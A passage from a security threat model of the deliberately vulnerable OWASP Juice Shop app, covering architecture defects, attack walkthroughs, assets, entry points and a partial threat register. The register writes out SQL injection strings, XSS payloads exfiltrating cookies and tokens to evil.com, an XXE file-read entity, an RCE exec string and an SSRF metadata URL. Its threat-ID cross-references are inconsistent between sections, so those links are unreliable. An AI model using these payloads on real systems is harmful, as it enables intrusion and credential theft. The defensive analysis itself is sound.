**Target architecture.** Upgrade to jsonwebtoken ^9.x; explicitly specify `algorithms: ['RS256']`; move signing key to environment variable; issue tokens into httpOnly SameSite=Strict cookies; implement token revocation list or short (15-minute) token lifetime.

**Linked threats:**

- [T-001](#t-001) — Hardcoded RSA key
- [T-002](#t-002) — SQL injection on login
- [T-003](#t-003) — JWT alg:none bypass
- [T-004](#t-004) — JWT in localStorage

#### 2.4.5 Authorization and Access Control

**Current state.** Role-based access uses four roles (customer/deluxe/accounting/admin) defined at [lib/insecurity.ts:139-144](vscode://file//home/mrohr/juice-shop/lib/insecurity.ts:139); enforcement via `isAuthorized()` middleware at [lib/insecurity.ts:54](vscode://file//home/mrohr/juice-shop/lib/insecurity.ts:54) and `isAccounting()` at [lib/insecurity.ts:160](vscode://file//home/mrohr/juice-shop/lib/insecurity.ts:160). No isAdmin() function exists.

**Structural defects:**

- No admin role middleware — admin endpoints (config, authentication-details) use customer-level isAuthorized()
- PUT /api/Products/:id authorization middleware commented out at [server.ts:L372](vscode://file//home/mrohr/juice-shop/server.ts:372) — unauthenticated product modification
- Role field accepted in registration POST body at [server.ts:L447](vscode://file//home/mrohr/juice-shop/server.ts:447) — any user self-assigns admin role
- Basket ownership not verified at [routes/basket.ts:20](vscode://file//home/mrohr/juice-shop/routes/basket.ts:20) — IDOR on all baskets
- Session token enumeration at [routes/authenticatedUsers.ts](vscode://file//home/mrohr/juice-shop/routes/authenticatedUsers.ts) accessible to all authenticated users

**Impact.** A customer-role user can access admin functionality, modify other users' data, and enumerate all active sessions. The authorization model has no meaningful privilege boundary.

**Target architecture.** Implement an `isAdmin()` role middleware; strip role from registration input; add ownership checks to all resource-scoped endpoints; restrict session enumeration to admin role.

**Linked threats:**

- [T-012](#t-012) — Unauthenticated product modification
- [T-013](#t-013) — IDOR on baskets
- [T-022](#t-022) — Session enumeration
- [T-042](#t-042) — Admin registration

#### 2.4.6 Input Validation and Output Encoding

**Current state.** Input validation is ad-hoc: `sanitize-html` applied in some contexts, `sanitize-filename` on upload names. Angular's template escaping is intentionally bypassed with `bypassSecurityTrustHtml` in three components.

**Structural defects:**

- `bypassSecurityTrustHtml` in search-result.component.ts:170, administration.component.ts:60, data-export.component.ts — disables Angular XSS protection at most sensitive display points
- No centralized input validation middleware — validation is per-route or absent
- Raw SQL string interpolation in login and search routes — no parameterization layer
- `noent: true` in XML parser enables XXE — no content-type validation layer
- Body parser accepts `*/*` content type with no schema enforcement

**Impact.** XSS is trivially achievable via URL parameters, registered user data, or any data that flows through the bypassed sanitizer. Combined with localStorage token storage, every XSS is a session theft.

**Target architecture.** Remove all `bypassSecurityTrustHtml` calls; use Angular's native text binding; implement parameterized queries throughout; add a centralized validation middleware (Joi or Zod schema) on all REST endpoints.

**Linked threats:**

- [T-017](#t-017) — Reflected XSS in search
- [T-018](#t-018) — Stored XSS in admin panel
- [T-025](#t-025) — XXE in XML upload

#### 2.4.7 Separation and Isolation

**Current state.** The Express monolith, SQLite, marsdb, and the eval sandbox all run in the same Node.js process. The Docker container provides some OS-level isolation with a non-root user (65532) and distroless image.

**Structural defects:**

- SQLite in-process — SQL injection has zero network hop to full DB extraction
- marsdb in-process — NoSQL injection accesses all reviews and orders directly
- B2B eval executes in vm.createContext within same process — sandbox escape = full process compromise
- File I/O for /ftp, /logs, /encryptionkeys from same process — injection exploits can directly read sensitive files
- No separate DB process means DB compromise = application compromise and vice versa

**Impact.** Any remote code execution (T-029) or SQL injection (T-002, T-007) immediately accesses all data stores, filesystem paths, and running application state simultaneously.

**Target architecture.** Move databases to separate containers on an isolated network. Run the eval endpoint in a separate sandboxed child process or remove it. Apply network policies to restrict which containers can reach the database.

**Linked threats:**

- [T-029](#t-029) — RCE via eval
- [T-031](#t-031) — In-process SQLite
- [T-025](#t-025) — XXE file read

#### 2.4.8 Defense-in-Depth

**Current state.** See [Section 2.3 Technology Architecture](#23-technology-architecture) for the full stack. Defense-in-depth layers are largely absent: no WAF at the perimeter, minimal helmet configuration (noSniff + frameguard only), wildcard CORS, no CSP, no CSRF protection, no anomaly detection.

**Structural defects:**

- No WAF or API gateway in front of Express — all attacks reach application code directly
- helmet configured for only 2 of ~15 available security headers
- CSP commented out at [server.ts:187](vscode://file//home/mrohr/juice-shop/server.ts:187) — XSS has no browser-level mitigation
- No CSRF tokens — state-changing endpoints vulnerable to cross-origin requests
- No anomaly detection or alerting — attacks are invisible until logs are manually reviewed
- Rate limiting only on 3 endpoints (reset-password, 2FA) and bypassable via header spoofing (T-039)

**Impact.** The absence of layered defense means each vulnerability is independently exploitable from the internet with no compensating control. A correctly designed architecture would require an attacker to defeat multiple independent layers.

**Target architecture.** Deploy a WAF (e.g., ModSecurity, cloud WAF) in front of Express; complete the helmet configuration including CSP and HSTS; implement CSRF tokens; add anomaly detection on auth events; rate-limit all unauthenticated endpoints.

**Linked threats:**

- [T-014](#t-014) — DoS via YAML bomb
- [T-015](#t-015) — CORS abuse / CSRF
- [T-017](#t-017) — XSS (no CSP)

#### 2.4.9 Overall Architecture Security Rating

🔴 **Critical gaps** — The application's security architecture has multiple independent critical failures that compound each other. Three separate authentication bypass mechanisms exist simultaneously. All application secrets are publicly readable in source code. The execution engine intentionally runs user-supplied JavaScript. The absence of any perimeter defense, secrets management, parameterized queries, or output encoding creates a system where every OWASP Top 10 category is exploitable with minimal effort. For a production application this architecture would be classified as critically insecure; in its role as a training platform it achieves its educational purpose by deliberately demonstrating all major vulnerability classes.

---

## 3. Attack Walkthroughs

The sequence diagrams below trace each Critical finding from initial attacker action to full exploitation. Every diagram shows the current vulnerable behaviour (alt branch) and the post-mitigation behaviour (else branch).

### T-002 — SQL Injection Login Bypass

This sequence shows how a crafted email parameter bypasses the authentication check entirely and yields an admin JWT from an unauthenticated position.

```mermaid
sequenceDiagram
    participant A as Attacker
    participant API as Express API
    participant DB as SQLite (in-process)
    A->>API: POST /rest/user/login (email=' OR 1=1--, password=anything)
    alt Current state — T-002
        API->>DB: SELECT * FROM Users WHERE email='' OR 1=1-- AND password='...' (raw concat)
        DB-->>API: returns first row — admin user record
        API-->>A: 200 OK — JWT for admin (role=admin, id=1)
        Note over A: Admin session without credentials
    else After M-002 — parameterized query
        API->>DB: SELECT * FROM Users WHERE email=$1 AND password=$2 (bound params)
        DB-->>API: no match — email field does not equal ' OR 1=1--
        API-->>A: 401 Unauthorized — Invalid email or password
    end
```

**Key takeaway:** Replacing string interpolation with a parameterized WHERE clause makes the injection payload a literal string value that cannot match any email address, closing the bypass completely at zero architectural cost.

### T-001 — Offline JWT Forgery via Hardcoded Private Key

This sequence shows how an attacker uses the publicly available RSA private key to forge an admin JWT without ever interacting with the login endpoint.

```mermaid
sequenceDiagram
    participant A as Attacker
    participant GH as GitHub / Docker Hub
    participant API as Express API
    participant AUTH as Auth Middleware
    A->>GH: GET https://github.com/juice-shop/juice-shop/blob/master/lib/insecurity.ts
    GH-->>A: RSA private key plaintext (lines 23-24)
    alt Current state — T-001
        Note over A: jwt.sign({role:'admin', email:'forge@test.com'}, privateKey, {algorithm:'RS256'})
        A->>API: GET /rest/user/authentication-details (Authorization: Bearer forged_token)
        API->>AUTH: jws.verify(token, publicKey) — signature valid
        AUTH-->>API: decoded payload — role=admin
        API-->>A: 200 OK — all active session tokens returned
        Note over A: Admin access + all user sessions enumerated
    else After M-001 — secrets from environment
        Note over A: private key not in source code
        Note over A: Cannot forge token without key material
        A->>API: GET /rest/user/authentication-details (forged token)
        API->>AUTH: jwt.verify — signature invalid (key mismatch)
        AUTH-->>API: UnauthorizedError
        API-->>A: 401 Unauthorized
    end
```

**Key takeaway:** Moving the RSA private key from source code to an environment variable eliminates offline JWT forgery entirely — an attacker with repo read access gains no cryptographic material.

### T-029 — Remote Code Execution via B2B Eval

This sequence shows how a prototype pollution payload in the B2B order body escapes the notevil sandbox and executes arbitrary Node.js code.

```mermaid
sequenceDiagram
    participant A as Attacker
    participant API as Express API
    participant EVAL as notevil/vm.createContext
    participant FS as Filesystem
    A->>API: POST /b2b/v2/orders (Authorization: Bearer valid_token)
    Note over A: Body: { orderLinesData: "...prototype pollution payload..." }
    alt Current state — T-029
        API->>EVAL: vm.runInContext('safeEval(orderLinesData)', sandbox, {timeout:2000})
        EVAL-->>API: sandbox escape — code executes as Node.js process
        API->>FS: require('fs').readFileSync('/etc/passwd')
        FS-->>API: file contents
        API-->>A: 500 with file contents in error message
        Note over A: RCE — full process compromise
    else After M-020 — JSON parse only
        API->>API: JSON.parse(orderLinesData)
        Note over API: Validates array structure — rejects non-JSON
        API-->>A: 400 Bad Request — Invalid order data
    end
```

**Key takeaway:** Replacing the eval-based execution with structured JSON parsing eliminates the RCE vector — no amount of JSON content can execute as code when the parser treats all input as data.

### T-025 — XXE via XML Upload

This sequence shows how an XML file with an external entity reference reads local files via the libxmljs2 parser.

```mermaid
sequenceDiagram
    participant A as Attacker
    participant UPLOAD as POST /file-upload
    participant PARSER as libxmljs2 (noent:true)
    participant FS as Filesystem
    A->>UPLOAD: POST /file-upload (file=evil.xml)
    Note over A: evil.xml: DOCTYPE with ENTITY xxe SYSTEM 'file:///etc/passwd'
    alt Current state — T-025
        UPLOAD->>PARSER: libxml.parseXml(data, { noent: true })
        PARSER->>FS: resolve external entity: /etc/passwd
        FS-->>PARSER: root:x:0:0:root:/root:/bin/bash...
        PARSER-->>UPLOAD: xmlDoc with entity expanded
        UPLOAD-->>A: 410 + error message containing /etc/passwd contents
    else After M-017 — noent:false
        UPLOAD->>PARSER: libxml.parseXml(data, { noent: false })
        Note over PARSER: external entity references not resolved
        PARSER-->>UPLOAD: xmlDoc without entity expansion
        UPLOAD-->>A: 410 — deprecated endpoint (no file contents)
    end
```

**Key takeaway:** Disabling external entity resolution (`noent: false`) is a one-character fix that completely eliminates the XXE vector — the deprecated XML endpoint still returns 410 but no longer discloses local files.

### T-022 — Session Token Enumeration

This sequence shows how any authenticated customer can retrieve all active session tokens and impersonate any user.

```mermaid
sequenceDiagram
    participant A as Attacker (Customer)
    participant API as Express API
    participant SESSION as authenticatedUsers map
    A->>API: GET /rest/user/authentication-details (Authorization: Bearer customer_token)
    alt Current state — T-022
        API->>SESSION: authenticatedUsers.tokenMap (no role check)
        SESSION-->>API: { token1: adminUser, token2: user2, token3: user3, ... }
        API-->>A: 200 OK — all active user sessions with tokens and email
        Note over A: Impersonates any user by using their token
    else After M-009 — admin role required
        API->>API: isAdmin() check — customer role fails
        API-->>A: 403 Forbidden — Malicious activity detected
    end
```

**Key takeaway:** Adding a single `isAdmin()` role check to the authentication-details route closes an endpoint that currently lets any customer harvest every active session in the application.

---

## 4. Assets

The table below identifies all assets requiring protection, classified by sensitivity, with cross-references to the threats that target them.

**Classification legend:** Restricted — highest sensitivity, direct business or security impact | Confidential — personal or business-sensitive data | Internal — operational data, not for external disclosure | Public — intentionally accessible.

| Asset | Classification | Description | Linked Threats |
|-------|---------------|-------------|----------------|
| JWT RSA Private Key | Restricted | 2048-bit signing key hardcoded in lib/insecurity.ts:23 | [T-001](#t-001) |
| Session Tokens (JWT) | Restricted | RS256 JWTs stored in localStorage, 6-hour expiry | [T-003](#t-003), [T-004](#t-004), [T-019](#t-019) |
| Admin Session | Restricted | Administrative JWT; forgeable offline | [T-001](#t-001), [T-022](#t-022) |
| Encryption Keys Directory | Restricted | /encryptionkeys served with directory listing | [T-011](#t-011) |
| CI/CD Secrets | Restricted | GitHub Actions NPM publish and deployment tokens | [T-036](#t-036) |
| User Credentials | Confidential | Email + MD5 password hash in SQLite Users table | [T-002](#t-002), [T-006](#t-006), [T-007](#t-007) |
| Customer PII | Confidential | Names, addresses, order history, card data (masked) | [T-013](#t-013), [T-031](#t-031) |
| Order and Payment Data | Confidential | Orders in MongoDB, basket contents, wallet balances | [T-032](#t-032) |
| Product Reviews (MongoDB) | Internal | Reviews in marsdb; vulnerable to mass update | [T-032](#t-032) |
| Challenge State | Internal | CTF completion flags and continue-codes | [T-023](#t-023) |
| Access Logs | Internal | Morgan combined logs exposed at /support/logs | [T-009](#t-009), [T-028](#t-028) |
| FTP Directory Contents | Internal | Legal docs, KeePass DB, order PDFs at /ftp | [T-008](#t-008) |
| Prometheus Metrics | Internal | /metrics — user counts, challenge state | [T-010](#t-010) |
| Product Catalog | Public | Products table; search endpoint vulnerable to UNION injection | [T-007](#t-007), [T-012](#t-012) |

## 5. Attack Surface

The Juice Shop exposes 12 entry points across unauthenticated and authenticated tiers. The unauthenticated surface is exceptionally wide for a production-grade application: 7 endpoints require no credentials at all, including file download, search, and a product image upload path that accepts arbitrary URLs.

### 5.1 Unauthenticated Entry Points (7)

| # | Entry Point | Protocol | Notes | Linked Threats |
|---|-------------|----------|-------|----------------|
| E-01 | `POST /api/Users/login` | HTTP/JSON | MD5 hashed password, SQL injectable | [T-001](#t-001), [T-003](#t-003) |
| E-02 | `GET /rest/products/search?q=` | HTTP/JSON | Raw SQL UNION injectable | [T-002](#t-002) |
| E-03 | `GET /ftp/:filename` | HTTP | Directory listing + path traversal | [T-025](#t-025), [T-026](#t-026) |
| E-04 | `GET /api/Products` | HTTP/JSON | Returns full product catalog + internal fields | [T-030](#t-030) |
| E-05 | `GET /metrics` | HTTP | Prometheus metrics exposed publicly | [T-031](#t-031) |
| E-06 | `GET /rest/basket/:id` | HTTP/JSON | IDOR — no session binding | [T-019](#t-019) |
| E-07 | `GET /api/Challenges` | HTTP/JSON | Discloses all challenge names and flags | [T-032](#t-032) |

### 5.2 Authenticated Entry Points (5)

| # | Entry Point | Protocol | Notes | Linked Threats |
|---|-------------|----------|-------|----------------|
| E-08 | `POST /file-upload` | HTTP/multipart | ZIP Slip, XXE, executable upload | [T-022](#t-022), [T-023](#t-023), [T-024](#t-024) |
| E-09 | `POST /api/Orders` (B2B) | HTTP/JSON | RCE via eval, JWT alg:none bypass | [T-004](#t-004), [T-029](#t-029) |
| E-10 | `PUT /profile/image/url` | HTTP/JSON | SSRF via unconstrained fetch | [T-021](#t-021) |
| E-11 | `PUT /rest/products/:id/reviews` | HTTP/JSON | NoSQL injection, mass-update | [T-020](#t-020) |
| E-12 | `GET /rest/user/authentication-details` | HTTP/JSON | Returns all active sessions to any auth'd user | [T-034](#t-034) |

---

## 6. Trust Boundaries

The monolithic architecture collapses what should be four separate trust zones into a single Node.js process. The most critical weakness is that the application database (SQLite), the eval sandbox, and the HTTP listener share one process and one filesystem namespace — a single code-execution vulnerability immediately yields full host access.

| # | Boundary | From | To | Enforcement Mechanism | Key Weakness | Linked Threats |
|---|----------|------|----|-----------------------|--------------|----------------|
| B-1 | Browser ↔ CDN/Reverse Proxy | End User Browser | Nginx / CDN edge | HTTPS TLS termination | No CSP; no HSTS preload; wildcard CORS | [T-005](#t-005), [T-006](#t-006), [T-007](#t-007) |
| B-2 | Public Internet ↔ Express App | CDN/Proxy | Node.js Express (port 3000) | None — no WAF, no API gateway | All routes public unless explicitly gated; rate limiting bypassable via X-Forwarded-For | [T-002](#t-002), [T-033](#t-033) |
| B-3 | Express App ↔ SQLite DB | Express routes | Sequelize + SQLite file | In-process — same PID | No query parameterization; any SQLi yields full DB read/write | [T-001](#t-001), [T-002](#t-002) |
| B-4 | Express App ↔ CI/CD Pipeline | Developer workstation / GitHub | GitHub Actions runners | GitHub branch protection (assumed) | Unpinned Action SHAs; git-hosted dev dependency | [T-041](#t-041), [T-042](#t-042) |

**Boundary B-2 details:** There is no API gateway or WAF layer. The rate-limit middleware trusts `X-Forwarded-For` by default, allowing any client to rotate its apparent IP address and defeat per-IP throttling ([server.ts:345](vscode://file/home/mrohr/juice-shop/server.ts:345)).

**Boundary B-3 details:** SQLite runs inside the same process as Express. A successful SQL injection or RCE immediately grants access to the entire database file at `data/juiceshop.sqlite` with no privilege escalation required.

---

## 7. Identified Security Controls

**Gap summary:** The application ships with almost no effective security controls. The most critical gaps are: (1) **no parameterized queries anywhere** — every database-touching route uses raw string interpolation, making SQLi a single-step exploit; (2) **a hardcoded RSA private key** committed to source code at [lib/insecurity.ts:23](vscode://file/home/mrohr/juice-shop/lib/insecurity.ts:23) meaning every JWT ever signed by the app can be forged by anyone with repo access; (3) **MD5 without salt** for password hashing means the entire user table is rainbow-table crackable offline after a single SQLi; (4) **eval-based B2B order processing** that can be escaped for RCE; and (5) **no Content Security Policy** header anywhere in the application, leaving XSS completely unmitigated at the browser layer.

Legend: ✅ Adequate | ⚠️ Partial | 🔶 Weak | ❌ Missing

| Domain | Control | Implementation | Effectiveness | Linked Threats |
|--------|---------|----------------|---------------|----------------|
| IAM | Password hashing | [`lib/insecurity.ts:44`](vscode://file/home/mrohr/juice-shop/lib/insecurity.ts:44) — MD5, no salt | ❌ Missing | [T-003](#t-003) |
| IAM | JWT authentication | [`lib/insecurity.ts:57`](vscode://file/home/mrohr/juice-shop/lib/insecurity.ts:57) — jws 0.x, accepts alg:none | ❌ Missing | [T-004](#t-004) |
| IAM | Session management | express-session with cookie secret 'kekse' | 🔶 Weak | [T-033](#t-033) |
| IAM | Account lockout / brute force protection | Rate limiter at [`server.ts:345`](vscode://file/home/mrohr/juice-shop/server.ts:345) — X-Forwarded-For bypassable | 🔶 Weak | [T-033](#t-033) |
| Authorization | Route-level auth middleware | `security.isAuthorized()` used on some routes; product PUT commented out | 🔶 Weak | [T-019](#t-019), [T-034](#t-034) |
| Authorization | Object-level ownership check | No ownership validation on basket, reviews, or user data endpoints | ❌ Missing | [T-019](#t-019), [T-020](#t-020) |
| Authorization | Admin privilege separation | Admin role checked by frontend only; backend routes not protected | ❌ Missing | [T-034](#t-034), [T-035](#t-035) |
| Data Protection | Database query parameterization | None — all queries use raw string interpolation | ❌ Missing | [T-001](#t-001), [T-002](#t-002) |
| Data Protection | Secrets management | RSA private key and HMAC secret hardcoded in [`lib/insecurity.ts`](vscode://file/home/mrohr/juice-shop/lib/insecurity.ts) | ❌ Missing | [T-010](#t-010) |
| Data Protection | Sensitive data exposure headers | `helmet()` with noSniff + frameguard only; CSP, HSTS, COEP absent | 🔶 Weak | [T-005](#t-005), [T-006](#t-006) |
| Input Validation | XML input validation | `noent: true` in libxmljs2 config — XXE explicitly enabled | ❌ Missing | [T-023](#t-023) |
| Input Validation | File upload validation | Extension check via `includes()` instead of `startsWith()`; no MIME validation | 🔶 Weak | [T-022](#t-022), [T-024](#t-024) |
| Input Validation | URL input validation | No allowlist or SSRF guard on profile image URL | ❌ Missing | [T-021](#t-021) |
| Audit & Logging | Application security logging | winston logger present; security events not consistently structured | ⚠️ Partial | [T-011](#t-011) |
| Infrastructure | CORS policy | `cors()` with no options — wildcard origin at [`server.ts:181`](vscode://file/home/mrohr/juice-shop/server.ts:181) | ❌ Missing | [T-007](#t-007) |
| Dependency | Dependency vulnerability scanning | Dependabot enabled (`.github/dependabot.yml`) | ⚠️ Partial | [T-036](#t-036) |
| Security Testing | SAST / CodeQL | CodeQL workflow present but uses unpinned `@v3` tags | ⚠️ Partial | [T-041](#t-041) |


---

## 8. Threat Register

**Risk Distribution:** Critical: 9 | High: 18 | Medium: 9 | Low: 6 | Total: 42

**STRIDE Coverage:** Spoofing: 6 | Tampering: 9 | Repudiation: 4 | Information Disclosure: 11 | Denial of Service: 5 | Elevation of Privilege: 7

### 8.1 Critical (9)

| ID | Component | STRIDE | Threat Scenario | Likelihood | Impact | Risk | Controls in Place | Mitigations |
|----|-----------|--------|-----------------|------------|--------|------|-------------------|-------------|
| <a id="t-001"></a>T-001 | auth-service | Tampering | Attacker sends `POST /api/Users/login` with email `' OR 1=1--` — raw string interpolation at [`routes/login.ts:34`](vscode://file/home/mrohr/juice-shop/routes/login.ts:34) yields `SELECT * FROM Users WHERE email = '' OR 1=1--'` returning the first user row (typically admin). CWE-89. | High | Critical | 🔴 Critical | MD5 hash comparison (trivially bypassed with the OR clause) | [M-001](#m-001) |
| <a id="t-002"></a>T-002 | rest-api | Information Disclosure | Attacker appends `')) UNION SELECT sql,2,3,4,5,6,7,8,9 FROM sqlite_master--` to `/rest/products/search?q=` at [`routes/search.ts:23`](vscode://file/home/mrohr/juice-shop/routes/search.ts:23), exfiltrating the full database schema and subsequently all table data including the Users table with MD5 hashed passwords. CWE-89. | High | Critical | 🔴 Critical | None | [M-001](#m-001) |
| <a id="t-003"></a>T-003 | auth-service | Information Disclosure | Full Users table obtained via T-001/T-002 SQLi contains MD5-hashed passwords with no salt at [`lib/insecurity.ts:44`](vscode://file/home/mrohr/juice-shop/lib/insecurity.ts:44). Every password is crackable offline against CrackStation/rainbow tables in seconds for common passwords. CWE-916. | High | Critical | 🔴 Critical | MD5 hashing (inadequate) | [M-002](#m-002) |
| <a id="t-004"></a>T-004 | b2b-api | Elevation of Privilege | `POST /api/Orders` JWT is verified with `jws.verify(token, publicKey)` at [`lib/insecurity.ts:57`](vscode://file/home/mrohr/juice-shop/lib/insecurity.ts:57) using jsonwebtoken 0.4.0 which accepts `alg: none` — attacker strips signature, sets `alg: none`, forges admin role claim, then injects `"orderLinesData": "'); process.mainModule.require('child_process').exec('id > /tmp/pwned');//"` into the B2B eval sandbox at [`routes/b2bOrder.ts:22`](vscode://file/home/mrohr/juice-shop/routes/b2bOrder.ts:22) for RCE. CWE-327, CWE-94. | Medium | Critical | 🔴 Critical | notevil sandbox (escapable) | [M-003](#m-003), [M-004](#m-004) |
| <a id="t-005"></a>T-005 | frontend-spa | Tampering | `bypassSecurityTrustHtml(queryParam)` at [`search-result.component.ts:170`](vscode://file/home/mrohr/juice-shop/frontend/src/app/search-result/search-result.component.ts:170) renders arbitrary HTML/JS from the `q=` URL parameter. No CSP header. Attacker delivers `/?q=<script>document.location='https://evil.com/?c='+document.cookie</script>` — Angular's sanitizer is explicitly disabled. CWE-79. | High | Critical | 🔴 Critical | Angular DomSanitizer bypassed intentionally | [M-005](#m-005), [M-006](#m-006) |
| <a id="t-006"></a>T-006 | admin-panel | Tampering | `bypassSecurityTrustHtml(user.email)` at [`administration.component.ts:60`](vscode://file/home/mrohr/juice-shop/frontend/src/app/administration/administration.component.ts:60) renders stored HTML from the email field. Attacker registers with email `<img src=x onerror=fetch('https://evil.com/?k='+localStorage.token)>` — executes in admin context on next admin page visit. CWE-79. | Medium | Critical | 🔴 Critical | None | [M-005](#m-005), [M-006](#m-006) |
| <a id="t-007"></a>T-007 | rest-api | Information Disclosure | RSA private key hardcoded at [`lib/insecurity.ts:23`](vscode://file/home/mrohr/juice-shop/lib/insecurity.ts:23). Any developer with repo access can forge valid JWTs for any user including admins. Key cannot be rotated without a code change + redeploy. CWE-321. | High | Critical | 🔴 Critical | None — key is public in repo | [M-007](#m-007) |
| <a id="t-008"></a>T-008 | file-upload | Elevation of Privilege | `routes/fileUpload.ts:40` checks path traversal with `String.includes('../')` — attacker uses `..%2F` or `....//` encoding to bypass and extract files to arbitrary paths (Zip Slip). Combined with the in-process Node.js runtime, attacker overwrites `server.ts` or injects a `.env` file. CWE-22. | Medium | Critical | 🔴 Critical | Weak includes() check | [M-008](#m-008) |
| <a id="t-009"></a>T-009 | file-upload | Information Disclosure | XML upload triggers `libxmljs2.parseXml(data, { noent: true })` at [`routes/fileUpload.ts:75`](vscode://file/home/mrohr/juice-shop/routes/fileUpload.ts:75). Attacker uploads `<\!DOCTYPE x [<\!ENTITY xxe SYSTEM "file:///etc/passwd">]><order>&xxe;</order>` — server reads and returns the contents of any file readable by the Node.js process. CWE-611. | Medium | Critical | 🔴 Critical | None — noent:true explicitly enables external entities | [M-009](#m-009) |

### 8.2 High (18)

| ID | Component | STRIDE | Threat Scenario | Likelihood | Impact | Risk | Controls in Place | Mitigations |
|----|-----------|--------|-----------------|------------|--------|------|-------------------|-------------|
| <a id="t-010"></a>T-010 | auth-service | Spoofing | HMAC secret `'this is the secret'` hardcoded at [`lib/insecurity.ts:45`](vscode://file/home/mrohr/juice-shop/lib/insecurity.ts:45). Any process with repo read access can generate valid HMAC-signed tokens for arbitrary users. CWE-321. | High | High | 🟠 High | None | [M-007](#m-007) |
| <a id="t-011"></a>T-011 | auth-service | Repudiation | Login events, password changes, and admin actions are logged via winston but log entries contain no cryptographic integrity protection and logs rotate without tamper evidence. An attacker covering tracks can truncate or overwrite `logs/access.log`. CWE-778. | Medium | High | 🟠 High | winston logger | [M-010](#m-010) |
| <a id="t-012"></a>T-012 | rest-api | Denial of Service | No payload size limit on `/api/Orders` B2B endpoint. Attacker sends megabyte-scale JSON orderLinesData, saturating the synchronous notevil eval loop and blocking the Node.js event loop for all concurrent requests. CWE-770. | High | High | 🟠 High | 2000ms vm timeout (not a size limit) | [M-011](#m-011) |
| <a id="t-013"></a>T-013 | rest-api | Denial of Service | `GET /rest/products/search?q=a%25a%25a%25` — LIKE query with leading `%` forces full table scan on every character repetition. No query timeout. Attacker submits 20-char pattern query in a loop, saturating SQLite I/O. CWE-400. | High | High | 🟠 High | None | [M-001](#m-001), [M-011](#m-011) |
| <a id="t-014"></a>T-014 | frontend-spa | Spoofing | JWT stored in `localStorage` at [`request.interceptor.ts:13`](vscode://file/home/mrohr/juice-shop/frontend/src/app/Services/request.interceptor.ts:13). Any XSS (T-005, T-006) immediately yields the token via `localStorage.getItem('token')`. No HttpOnly flag possible for localStorage. CWE-922. | High | High | 🟠 High | None | [M-005](#m-005), [M-012](#m-012) |
| <a id="t-015"></a>T-015 | rest-api | Spoofing | Open redirect at redirect route: URL validation uses `String.includes('https://github.com/bkimminich/juice-shop')` — attacker uses `https://evil.com?x=https://github.com/bkimminich/juice-shop` to bypass. Victim clicks phishing link, is redirected to attacker site. CWE-601. | Medium | High | 🟠 High | Partial string match (bypassable) | [M-013](#m-013) |
| <a id="t-016"></a>T-016 | sqlite-db | Information Disclosure | SQLite database file `data/juiceshop.sqlite` is stored in the application working directory with no encryption. Any process or container escape that grants filesystem read access exfiltrates the full database including all user credentials and orders. CWE-312. | Medium | High | 🟠 High | None | [M-014](#m-014) |
| <a id="t-017"></a>T-017 | rest-api | Elevation of Privilege | `PUT /api/Products/:id` authorization middleware is commented out in [`server.ts`](vscode://file/home/mrohr/juice-shop/server.ts) — any authenticated user can update any product's name, description, or price. CWE-862. | High | High | 🟠 High | None (middleware removed) | [M-015](#m-015) |
| <a id="t-018"></a>T-018 | rest-api | Elevation of Privilege | `GET /ftp/` at [`server.ts:269`](vscode://file/home/mrohr/juice-shop/server.ts:269) exposes `serveIndex` with directory listing — unauthenticated user browses and downloads all files in the `ftp/` directory including confidential documents and backup files. CWE-548. | High | High | 🟠 High | None | [M-016](#m-016) |
| <a id="t-019"></a>T-019 | rest-api | Elevation of Privilege | `GET /rest/basket/:id` at [`routes/basket.ts:20`](vscode://file/home/mrohr/juice-shop/routes/basket.ts:20) fetches basket by path param ID with no check that `req.user.bid === id`. Any authenticated user reads any other user's basket including their items and delivery address. CWE-639. | High | High | 🟠 High | Authentication required | [M-017](#m-017) |
| <a id="t-020"></a>T-020 | rest-api | Tampering | `PUT /rest/products/:id/reviews` passes `req.body.id` directly to marsdb `update({ _id: req.body.id }, ..., { multi: true })` at [`routes/updateProductReviews.ts:15`](vscode://file/home/mrohr/juice-shop/routes/updateProductReviews.ts:15). Attacker sends `{ id: { $gt: "" } }` — NoSQL injection selects all reviews and overwrites them with the attacker's message. CWE-943. | Medium | High | 🟠 High | Authentication required | [M-018](#m-018) |
| <a id="t-021"></a>T-021 | rest-api | Information Disclosure | `PUT /profile/image/url` passes attacker-controlled URL to `fetch(url)` at [`routes/profileImageUrlUpload.ts:22`](vscode://file/home/mrohr/juice-shop/routes/profileImageUrlUpload.ts:22) with no allowlist. Attacker sets `url=http://169.254.169.254/latest/meta-data/iam/security-credentials/` to reach EC2 IMDS and exfiltrate cloud credentials. CWE-918. | Medium | High | 🟠 High | None | [M-019](#m-019) |
| <a id="t-022"></a>T-022 | file-upload | Tampering | File upload accepts `.exe`, `.sh`, `.php`, and other executable extensions — MIME type not validated, only extension checked with `includes()`. Attacker uploads a malicious `.js` file renamed `payload.pdf.js` — `includes('.pdf')` is true, file is stored. If server is misconfigured to serve uploads as static files, attacker achieves stored XSS or RCE. CWE-434. | Medium | High | 🟠 High | Partial extension check | [M-020](#m-020) |
| <a id="t-023"></a>T-023 | file-upload | Information Disclosure | XXE via XML upload (see T-009) can be chained to read application secrets: `file:///home/juice-shop/lib/insecurity.ts` (RSA key), `file:///home/juice-shop/.env`, or internal network services via `http://` URIs if the server has internal network access. CWE-611. | Medium | High | 🟠 High | None | [M-009](#m-009) |
| <a id="t-024"></a>T-024 | file-upload | Denial of Service | No file size limit on the ZIP upload handler. Attacker uploads a ZIP bomb (e.g. 42.zip — 42KB expanding to 4.5PB) triggering extraction loop exhausting disk space or memory, crashing the Node.js process. CWE-400. | Medium | High | 🟠 High | None | [M-020](#m-020), [M-011](#m-011) |
| <a id="t-025"></a>T-025 | file-upload | Information Disclosure | FTP directory listing at `/ftp` exposes `acquisitions.md`, `coupons_2013.md`, `package.json.bak`, and other sensitive internal files — unauthenticated, no authentication required. CWE-548. | High | High | 🟠 High | None | [M-016](#m-016) |
| <a id="t-026"></a>T-026 | file-upload | Information Disclosure | `/ftp/:filename` with null byte injection (`%00`) or dot-dot-slash allows path traversal above the `ftp/` directory to read application source files. CWE-22. | Medium | High | 🟠 High | None | [M-008](#m-008) |
| <a id="t-027"></a>T-027 | ci-cd-pipeline | Tampering | GitHub Actions workflows reference `actions/checkout@v3`, `github/codeql-action/init@v3`, `github/codeql-action/analyze@v3` by mutable floating tag. A compromised GitHub Action at any of these refs can execute arbitrary code in the CI environment, exfiltrating secrets and publishing malicious build artifacts. CWE-1357. | Low | High | 🟠 High | GitHub Actions OIDC | [M-021](#m-021) |

### 8.3 Medium (9)

| ID | Component | STRIDE | Threat Scenario | Likelihood | Impact | Risk | Controls in Place | Mitigations |
